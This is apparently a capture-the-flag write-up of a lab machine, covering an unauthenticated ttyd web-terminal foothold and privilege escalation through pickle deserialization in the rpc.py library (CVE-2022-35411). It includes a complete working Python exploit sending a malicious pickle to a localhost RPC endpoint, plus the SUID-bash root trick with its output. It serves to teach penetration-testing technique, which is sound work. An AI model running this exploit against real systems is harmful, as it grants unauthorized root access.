
## Summary

The foothold on this box is unusual — a `ttyd` web terminal exposed on port 8000 hands over an interactive low-privilege shell directly through the browser, no exploitation needed to get in. The real work is privesc: enumeration turns up an internal-only RPC service (`rpc.py`, from the `rpcpy` library) bound to localhost, whose custom serializer accepts pickled Python objects — a classic insecure-deserialization RCE. Exploiting that from the low-priv shell as a loopback client gives arbitrary command execution as whatever user runs the RPC service (root), finished off with the standard SUID-bash trick.

**Chain:** exposed `ttyd` web terminal → low-priv shell as `user` → find internal RPC service in `/opt` + supervisor configs → identify `rpc.py`/`rpcpy` pickle deserialization (CVE-2022-35411) → craft malicious pickle payload → RCE as the RPC service's user (root) → SUID bash → root

---

## Enumeration

### Nmap / initial access

Nmap shows a web server on **port 8000**. Browsing to it doesn't present a typical web app — it's a **`ttyd`** instance, which serves a full terminal session in the browser. It's already authenticated (or has no auth) as a low-privileged user, `user`.

**Pattern to remember:** `ttyd` (and similar tools like GoTTY) expose a real shell over HTTP/WebSocket. If you see one exposed, treat it exactly like SSH access — it's a genuine foothold, not something you need to "exploit" to use. Always check whether it requires auth; if it doesn't, that's the box's actual vulnerability right there.

### Filesystem enumeration from the shell

With a shell as `user`, standard practice: look around `/opt`, check running network connections, and check service configuration under `/etc/supervisor/conf.d/` (Supervisor is a common process manager for keeping custom services alive — its config directory is a great place to learn what non-standard services a box is running and how).

**Findings:**

- `/opt/rpc.py` — a Python script setting up an RPC server using the `rpcpy` / `rpc.py` library, listening on **port 65432**.

```python
if __name__ == "__main__":
    uvicorn.run(app, interface="asgi3", port=65432)
```

- Checking active network connections (`ss -tlnp` or similar) confirms this RPC server is actually running — bound to localhost, so not reachable from outside, but reachable from our current shell.
- `/etc/supervisor/conf.d/` contains **`rpc.conf`** and **`ttyd.conf`** — confirming both the web terminal and the RPC service are managed as persistent background services, and telling us what user/permissions each runs under.

**Pattern to remember:** always check `/etc/supervisor/conf.d/`, systemd unit files, or equivalent when you land a shell — these configs tell you exactly what custom services exist on the box, what account runs them, and often the exact command line/arguments used to start them. This is frequently how you discover internal-only services that never show up in an external Nmap scan, precisely because they're bound to `127.0.0.1`.

---

## Privilege Escalation

### Identifying the vulnerability

`rpc.py` is a real PyPI package ([rpc.py on PyPI](https://pypi.org/project/rpc.py/)) — a lightweight RPC framework built on ASGI/WSGI that lets you expose Python functions as remote-callable endpoints.

Searching "python rpcpy exploit" surfaces:

- [Snyk vulnerability advisory](https://security.snyk.io/vuln/SNYK-PYTHON-RPCPY-2946719)
- [Exploit-DB PoC](https://www.exploit-db.com/exploits/50983)
- CVE: **[CVE-2022-35411](https://nvd.nist.gov/vuln/detail/CVE-2022-35411)**

The vulnerability: `rpc.py` supports multiple serialization formats for request bodies, selected via a `serializer` header — and one of the supported options is **`pickle`**. Python's `pickle` module is well known to execute arbitrary code during deserialization if the attacker controls the pickled data, because unpickling can invoke arbitrary object constructors/methods, including `os.system`.

**Pattern to remember:** any time an application (RPC framework, cache, message queue, session store) accepts pickle — or any language's native "deserialize whatever" format — as attacker-controlled input, that's presumptively a full RCE vulnerability until proven otherwise. This class of bug shows up under many names (Java deserialization, PHP object injection, Python pickle, .NET `BinaryFormatter`) but the shape is always the same: deserialization runs code, so controlling the serialized bytes means controlling execution.

### Building the pickle RCE payload

The trick with pickle-based RCE is the `__reduce__` method: when an object is pickled, Python can be told (via `__reduce__`) to reconstruct it by calling an arbitrary callable with arbitrary arguments on unpickling. Pointing that callable at `os.system` turns "deserialize this object" into "run this shell command."

```python
import requests
import pickle

HOST = "127.0.0.1:65432"
URL = f"http://{HOST}/sayhi"
HEADERS = {"serializer": "pickle"}

def generate_payload(cmd):
    class PickleRce(object):
        def __reduce__(self):
            import os
            return os.system, (cmd,)
    return pickle.dumps(PickleRce())

def exec_command(cmd):
    payload = generate_payload(cmd)
    requests.post(url=URL, data=payload, headers=HEADERS)

def main():
    exec_command('id;chmod u+s /bin/bash')

if __name__ == "__main__":
    main()
```

Key details:

- `HOST` targets `127.0.0.1:65432` because the RPC service is internal-only — this exploit has to be run **from the box itself**, using the low-priv shell as the delivery mechanism to reach localhost.
- The `serializer: pickle` header is what tells `rpc.py` to unpickle the request body instead of using a safer format like JSON — this header is the actual trigger for the vulnerability.
- Any existing endpoint (here, `/sayhi`) works as the delivery point, since the deserialization happens before the endpoint's own logic really matters.
- The command `id;chmod u+s /bin/bash` runs as whatever user the RPC service runs as (root, per the supervisor config) — setting the SUID bit on bash for a reliable, reusable root shell afterward.

### Executing and confirming root

```bash
python3 expl.py
```

```
b'\x80\x04\x951\x00\x00\x00\x00\x00\x00\x00\x8c\x05posix\x94\x8c\x06system\x94\x93\x94\x8c\x16id;chmod u+s /bin/bash\x94\x85\x94R\x94.'
```

```bash
ls -alh /bin/bash
-rwsr-xr-x 1 root root 1.2M Apr 18  2022 /bin/bash

/bin/bash -p -i
id
# uid=1000(user) gid=1000(user) euid=0(root) groups=1000(user)
```

`euid=0(root)` confirms the SUID bit worked and we have effective root via the `-p` flag (preserves privileges rather than letting bash drop them).

---

## Lessons / Transferable Techniques

1. **Web-exposed terminals (`ttyd`, GoTTY, etc.) are direct footholds**, not something to "exploit" — if reachable and unauthenticated, that exposure is the vulnerability.
2. **Check process-manager configs (`/etc/supervisor/conf.d/`, systemd units) immediately after landing any shell.** They reveal internal-only services, their bind addresses, and what user runs them — often surfacing attack surface invisible to an external port scan.
3. **Localhost-bound services are still attack surface once you have any shell on the box.** "Internal only" doesn't mean "safe" — it means "reachable once you're inside," which you already are.
4. **Any serializer option that includes `pickle` (or an equivalent native-deserialization format) accepting attacker input is a red flag for RCE.** Look specifically for a `serializer`/`format`/`content-type`-style header or parameter that lets you switch to it.
5. **The `__reduce__` pickle payload pattern is the standard building block for Python deserialization RCE** — worth keeping the snippet above as a reusable template; swap `os.system` calls and the target command as needed.
6. **`chmod u+s /bin/bash` + `bash -p -i`** — same reliable "cash in one root command" pattern seen on other boxes; worth having memorized as a default payload whenever a single arbitrary-command-as-root primitive is found.

